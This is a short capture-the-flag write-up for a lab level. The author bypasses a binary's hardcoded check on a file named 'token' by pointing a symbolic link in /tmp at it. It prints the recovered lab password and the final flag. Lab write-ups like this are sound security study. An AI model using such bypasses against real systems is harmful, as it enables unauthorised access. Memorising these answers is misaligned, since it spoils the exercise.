# level08

We're presented with an executable `level08` and a `token` file we can't read.

We run `./level08` and get :

```
./level08 [file to read]
```

We try `./level08 token` :

```
You may not access 'token'
```

We run `strings ./level08`. Along with the messages above, we see a string that reads `token`. It's likely that whoever wrote the program hardcoded it to prevent any file named "token" from being read.

We can circumvent this issue with a symbolic link. We run :

```
ln -sf /home/user/level08/token /tmp/link
./level08 /tmp/link
```

The program is tricked, and outputs the contents of `token`. It's not actually the level's flag, but the password for user `flag08` :

```
quif5eloekouj29ke0vouxean
```

## The flag

We run `su flag08` and get our flag with getflag :

```
25749xKZ8L7DkSCwJkT9dyv6f
```